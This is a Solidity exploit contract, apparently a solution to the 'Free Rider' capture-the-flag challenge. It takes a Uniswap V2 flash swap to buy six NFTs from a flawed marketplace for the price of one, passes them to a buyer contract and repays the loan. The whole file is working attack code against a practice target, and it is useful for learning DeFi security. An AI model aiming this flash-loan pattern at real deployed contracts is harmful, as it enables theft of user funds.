import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";

contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    using Address for address;
    address payable immutable weth;
    address immutable dvt;
    address immutable factory;
    address payable immutable buyerMarketplace;
    address immutable buyer;
    address immutable nft;

    constructor(
        address payable _weth,
        address _factory,
        address _dvt,
        address payable _buyerMarketplace,
        address _buyer,
        address _nft
    ) {
        weth = _weth;
        dvt = _dvt;
        factory = _factory;
        buyerMarketplace = _buyerMarketplace;
        buyer = _buyer;
        nft = _nft;
    }

    event Log(string message, uint256 val);

    function attack(address _tokenBorrow, uint256 _amount) public {
        // Ensure there is a pair address contract available
        address pair = IUniswapV2Factory(factory).getPair(_tokenBorrow, dvt);
        require(pair != address(0), "!pair init");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        // Ensure we are borrowing the correct token (WETH)
        uint256 amount0Out = _tokenBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenBorrow, _amount);

        // Call uniswap for a flashswap
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        address pair = IUniswapV2Factory(factory).getPair(token0, token1);

        // Ensure the pair contract is the same as the sender
        // and this contract was the one that initiated it.
        require(msg.sender == pair, "!pair");
        require(sender == address(this), "!sender");

        // Decode custom data set in flashLoan()
        (address tokenBorrow, uint256 amount) = abi.decode(
            data,
            (address, uint256)
        );

        // Calculate Loan repayment
        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;

        uint256 currBal = IERC20(tokenBorrow).balanceOf(address(this));

        // Withdraw all WETH to ETH
        IWETH(tokenBorrow).withdraw(currBal);

        // Load uint256s (there is surely a better way to do this)
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        // Purchase all NFTs for the Price of 1
        FreeRiderNFTMarketplace(buyerMarketplace).buyMany{value: amount}(
            tokenIds
        );

        // Transfer newly attained NFTs to Buyer Contract
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(address(this), buyer, i);
        }

        // Deposit ETH into WETH contract
        // ETH came from Buyer Contract + Marketplace exploit
        IWETH(tokenBorrow).deposit{value: amountToRepay}();

        // Pay back Loan with deposited WETH funds
        IERC20(tokenBorrow).transfer(pair, amountToRepay);
    }

    // Interface required to receive NFT as a Smart Contract
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
